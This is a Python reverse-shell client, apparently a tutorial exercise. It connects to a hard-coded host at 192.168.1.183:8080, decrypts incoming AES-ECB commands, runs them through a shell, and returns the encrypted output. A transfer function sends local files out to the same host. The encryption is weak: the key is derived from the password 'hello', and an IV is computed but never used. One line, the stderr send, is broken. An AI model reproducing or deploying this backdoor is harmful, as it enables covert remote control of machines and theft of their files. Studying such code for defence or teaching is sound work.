import socket
import subprocess # See video https://www.youtube.com/watch?v=2Fp1N6dof0Y
import os
from Crypto.Cipher import AES
import hashlib
import sys
import binascii
import Padding

password='hello'
ival=10

key = hashlib.sha256(password.encode()).digest()
iv= hex(ival)[2:8].zfill(16)  
#command is the data we will encrypt ie the plaintext

def encrypt(plaintext,key, mode):
    encobj = AES.new(key,mode)
    return(encobj.encrypt(plaintext))

def decrypt(ciphertext,key, mode):
    encobj = AES.new(key,mode)
    return(encobj.decrypt(ciphertext))



def transfer(s, path):
    if os.path.exists(path):
        f = open(path, 'rb')
        packet = f.read(1024)
        while len(packet) > 0:
            s.send(packet)
            packet = f.read(1024)
        s.send("DONE".encode())
    else:
        s.send("File not found".encode())


def connect():
    s = socket.socket()
    #s.connect(("10.174.15.6",8080))
    s.connect(("192.168.1.183",8080))
    while True:
        
                
        command = s.recv(1024)

        print("Decypting command")
        plaintext = command
        # We now decrypt the text
        plaintext = decrypt(plaintext,key,AES.MODE_ECB)
        print("The plain text raw but decrypted",plaintext)
        #Remove all the padding
        plaintext = Padding.removePadding(plaintext.decode(),mode=0)
        #Command now in raw text command
        print ("  decrypt: "+plaintext)
        
        # See the video above which explains how the subprocess element works
        # A pipe has two endpoints
        CMD = subprocess.Popen(plaintext, shell = True, stdout = subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        
        plaintext = CMD.stdout.read()
        print(plaintext)
        
        #convert byte to string!!!
        
        plaintext = Padding.appendPadding(plaintext,blocksize=Padding.AES_blocksize,mode=0)
        print("The plain text with padding added",plaintext)
        #print ("Input data (CMS): "+binascii.hexlify(plaintext.encode()).decode())

        ciphertext = encrypt(plaintext.encode(),key,AES.MODE_ECB)
        print("The command encrypted",ciphertext)        
        
        
        #Capture the standout and send the output to the server
        #s.send(ciphertext.stdout.read())
        s.send(ciphertext)
        # Capture any command errors and send the 
        s.send(ciphertext.stderr.read())

def main():
    key = hashlib.sha256(password.encode()).digest()
    
    iv= hex(ival)[2:8].zfill(16)    

    connect()
main()
